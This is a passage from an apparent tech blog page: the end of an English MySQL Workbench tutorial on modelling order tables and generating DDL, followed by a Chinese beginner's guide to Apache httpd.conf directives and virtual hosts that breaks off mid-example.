ORDER_TYPE. The ORDER_TYPE can have one of two values: S for sales order, P for purchase order. As sales order is more common, we’d like to specify it as the column’s default value.</p> <p>You add the next column by double-clicking the white space below the last column.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image17.png" /></p> <p>In the same way, create the SALES_ORDER table and its columns.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image18.png" /></p> <p>Lastly, create the PURCHASE_ORDER table and its columns.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image19.png" /></p> <h1>Create Relationships</h1> <p>We have now created all three tables and their columns. We haven’t done yet with our model; we still need to create the subtype relationships of our tables.</p> <p>The SALES_ORDER is a subtype of ORDER, implying their relationship is 1:1 with the SALES_ORDER as the child and ORDER the parent, and also the ORDER’s key migrated to the SALES_ORDER. So, select (click) the 1:1 identifying relationship icon, and click it on the SALES_ORDER table and then ORDER table.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image20.png" /></p> <p>Notice that the icon changes to a hand with the 1:1 relationship when you click it to the tables.</p> <p style="text-align: center"><img style="border-bottom: black 1px solid; border-left: black 1px solid; border-top: black 1px solid; border-right: black 1px solid" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image21.png" /></p> <p style="text-align: center"><img style="border-bottom: black 1px solid; border-left: black 1px solid; border-top: black 1px solid; border-right: black 1px solid" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image22.png" width="217" height="205" /></p> <p>The 1:1 relationship is set; the ORDER_NO primary key is migrated and becomes the primary key of the SALES_ORDER table.</p> <p style="text-align: center"><img style="border-bottom: black 1px solid; border-left: black 1px solid; border-top: black 1px solid; border-right: black 1px solid" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image23.png" width="225" height="278" /></p> <p>Next, create the PURCHASE_ORDER to ORDER relationship, which is also 1:1 identifying relationship.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image24.png" /></p> <p>We have now completed designing our tables and their relationships; let’s save our model as ORDER.mwb.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image25.png" /></p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image26.png" /></p> <h1>Generate DDL and Database</h1> <p>The final step of our data modeling in this article is generating the model into MySQL database. We’ll first generate the DDL (SQL CREATE script), and then execute the script.</p> <p>From the <b>File | Export</b> menu, select <b>Forward Engineer SQL CREATE Script</b>.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image27.png" /></p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image28.png" /></p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image29.png" /></p> <p>Lastly, execute the saved SQL CREATE script. We execute the script outside of MySQL Workbench; for example, we can execute it in a MySQL command console.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image30.png" /></p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image31.png" /></p> <p>You can also confirm that the tables have been created.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image32.png" /></p> <h1>Summary</h1> <p>This article shows you how to build a MySQL physical data model visually in MySQL Workbench, and generate the model into its MySQL database.</p> <p class="read-more">Continue reading <a class="heading" href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2011/06/09/mysql-workbench-e4-bd-bf-e7-94-a8-e6-96-b9-e6-b3-95-2.html" data-flip="title">MySQL Workbench使用方法</a></p> </article> <article id="post-php/2011/06/09/%e3%80%90%e8%bd%ac%e3%80%91apache%e5%9f%ba%e6%9c%ac%e9%85%8d%e7%bd%ae%e6%8c%87%e5%8d%97" class="post mb6" role="article"> <header> <h1 class="post-title"> <a href="/php/2011/06/09/e3-80-90-e8-bd-ac-e3-80-91apache-e5-9f-ba-e6-9c-ac-e9-85-8d-e7-bd-ae-e6-8c-87-e5-8d-97.html" data-flip="title"> 【转】Apache基本配置指南 </a> </h1> <p class="post-date heading"> <time datetime="2011-06-09T18:30:17+08:00">09 Jun 2011</time> in <span>Php</span> on <span>Apache</span>, <span>Server</span> </p> <div class="hr" style="padding-bottom:0"></div> </header> <h2 id="internal-source-marker_0.9801242883032882">&#160;</h2> <p> <span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">适合新手看的</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">当初学的时候做的笔记，不是很全，别笑俺。欢迎老手们修正和补充</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">1、如果找不到文件的具体位置，在Linux下可以用类似locate httpd.conf的指令来搜索文件的位置。如果搜索不到，可以先用updatedb指令更新索引数据库再用locate搜索。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">2、apachectl configtest或apachectl –t检查配置文件是否合法。apachectl一般位于安装目录的bin目录下（如：/usr/local/apache2/bin）。不要直接调用httpd。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">3、配置文件是httpd.conf；在Linux系统中，它可能存在于系统配置目录（如：/etc/httpd/conf/），也可能存在于Apache的安装目录（如：/usr/local/apache2/conf）。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">4、配置文件中，一行包含一个指令，但行尾可以用\表示续行。\与下一行之间不能有其它任何字符，包括空白字符。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">#表示这一行是注释。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">5、指令对大小写不敏感，但是参数对大小定敏感，在Linux系统下，路径也要注意大小写。路径后不必加/。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">6、类似于&lt;Directory&gt;&lt;/Directory&gt;表示一个配置段。大多数配置段中的指令仅针对配置段所匹配的请 求有 效。但诸如&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;IfDefine&gt;、&lt;IfModule&gt;、&lt;IfVersion&gt;之类，是在Apache启动时，如果条 件成立才有效，并且对所有请求都有效。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">httpd.conf的基本配置选项</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">7、ServerName服务器名称。它用来创建URL的重导向。ServerName是apache服务器自身识别访问请求的标记之一，他不必与实际IP或DNS名称一致。也可以不设置，如果这样，那apache会试图用IP来作为请求的标记。端口也可以不设置。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">例：ServerName</span><a href="http://www.example.com/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">www.example.com:80</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">8、ServerAdmin管理员的电子邮件地址。服务器的错误提示页会用到。如果ServerSignature定义为Email的话，将在错误页的页尾增加ServerAdmin的链接。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">9、Listen服务器监听的地址和端口。端口一定要指定。默认情况下，服务器会监听本机的所有地址。可以同时使用多个Listen指令。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">例一：同时所有接受来自端口80和8000的请求</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Listen 80</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Listen 8080</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">例二：指定地址+端口，配置虚拟主机时，会需要这样设置。详细看虚拟主机的设置。这并不是必要的。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Listen 192.168.0.2:80</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Listen 192.168.0.1:8080</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">注意地址是本机的地址，是指客户端对本机某个地址的请求。地址可以是域名，但最好是IP地址。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">例三：IPv6地址必须用方括号括起来。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Listen [2001:db8::a00:20ff:fea7:ccea]:80</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">例四：要使Apache只处理IPv4的请求，只需如此：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Listen 0.0.0.0:80</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">10、ServerRoot 服务器基础目录，一般就是Apache的安装目录，不必更改。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">11、 DocumentRoot 指定主目录。不指定的话，默认目录一般是ServerRoot目录下的htdocs目录（如/usr/local/apache2/htdocs），视版 本而定；但是可能会有例外，所以最好指定。如果指定相对路径，则认为是相对于ServerRoot目录的。目录后不要加/。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">12、DirectoryIndex 默认首页名称。多个默认页名称用空格隔开。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">13、ErrorDocument 处理请求出错时的处理方式。未配置时只返回错误代码。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">例：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ErrorDocument 500 “The server made a boo boo.”</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"># 指定本地URL时，该URL是相对于DocumentRoot目录的。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ErrorDocument 404 /missing.html</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ErrorDocument 404 “/cgi-bin/missing_handler.pl”</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"># 使用绝对URL时，客户机将无法收到错误码。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ErrorDocument 402</span><a href="http://www.example.com/subscription_info.html"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">http://www.example.com/subscription_info.html</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">14、ErrorLog，CustomLog 指定错误日志和访问日志。如果指定路径是相对路径，则认为是相对ServerRoot目录的。日志文件可能会很大，以至影响到其它文件的储存空间，所以有必要把日志文件放到一个单独的分区。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">例一：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ErrorLog /var/log/error_log</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"># commom是日记文件的格式，由LogFormat定义。不可用于ErrorLog。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Customlog /var/log/access_log common</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">例二：管道日志，可以用Apache提供的rotatelogs来实现。rotatelogs程序一般位于安装目录的bin目录。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"># 这将每24小时建立日志文件/var/log/logfile.nnnn，nnnn是日记建立时的系统时间。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">CustomLog “|bin/rotatelogs /var/log/logfile 86400”common</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"># 日志文件达到5M时建立新日记，文件名类似于logfile.2006-12-30-24_33_12。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ErrorLog “|bin/rotatelogs /var/log/logfile.%Y-%m-%d-%H_%M_%S 5M”</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">15、User, Group 指定运行服务子进程的用户和组。Rpm包安装apache时会自动设置一个用户和组，但有时会设成nobody或者不设置。为了安全和方便管理，设置为用户和组为apache是很重要的。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">例：User apache</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Group apache</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">注意在Linux系统中手动添加apache用户和组时，必须把他们的shell指定为nologin</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">虚拟主机</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">16、虚拟主机通过&lt;VirtualHost&gt;配置段来配置，配置段里的指令对虚拟主机有效，配置段没有配置的，将采用全局的配置。检查虚拟主机的配置可用apachectl –S（可能某些版本这个参数无效）。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">17、基于域名的虚拟主机在DNS把多个域名都映射到同一IP的情况下有用。典型的配置如下：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">NameVirtualHost *:80</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost *:80&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerAdmin webmaster@test.com</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/docs/test.com</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName test.com</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ErrorLog logs/dummy-host.example.com-error_log</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">CustomLog logs/dummy-host.example.com-access_log common</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost *:80&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/docs/test2.com</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName test2.com</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">NameVirtualHost *:81</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost *:81&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/docs/test3.com</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName test3.com</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">注意一：NameVirtualHost 指定虚拟主机所使用的IP地址或域名，但是最好是IP地址。使用基于域名的虚拟主机时，NameVirtualHost是必要的指令。NameVirtualHost可以定义多个。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">注意二：所有符合NameVirtualHost或&lt;VirtualHost&gt;标签定义的请求，都会被作为虚拟主机处理，而主服务器将不理 会。NameVirtualHost定义了而&lt;VirtualHost&gt;标签没有定义的的请求，服务器会找不到相应的虚拟主机而将无法处理。 所以每个NameVirtualHost定义的参数至少要有一个&lt;VirtualHost&gt;相匹配。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">注意三：如果设置NameVirtualHost 或&lt;VirtualHost&gt;为*:80的话，所有针对80端口的请求，都会被虚拟主机处理，请求会根据域名指向某个虚拟主机。如果有来自 80端口的请求，而所请求的域名没有被配置为虚拟主机，那将指向第一个虚拟主机。这样主服务器将无法收到来自80端口的任何请求。为此也要为主服务器配置 一个虚拟主机。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">18、ServerAlias 虚拟主机的别名</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">例：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">NameVirtualHost *:80</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost *:80&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName</span><a href="http://www.domain.tld/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">www.domain.tld</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerAlias domain.tld *.domain.tld</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/domain</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">这表示对 domain.tld和*.domain.tld的请求也由虚拟主机</span><a href="http://www.domain.tld/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">www.domain.tld</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">处理。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">19、ServerPath指令是用于让某些老式浏览器也访问基于域名的虚拟主机的，一般不必设置。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">20、基于IP地址的虚拟主机。例：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Listen 80</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost 172.20.30.40&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/example1</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName</span><a href="http://www.example.com/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">www.example.com</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost 172.20.30.50 192.168.0.10:80&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/example2</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName</span><a href="http://www.example.org/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">www.example.org</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">每个虚拟主机可定义多个IP，之间用空格隔开。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">21、各种虚拟主机的混用。例：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Listen 80</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Listen 81</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">NameVirtualHost 172.20.30.40</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost 172.20.30.40&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/example1</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName</span><a href="http://www.example.com/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">www.example.com</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost 172.20.30.40&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/example2</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 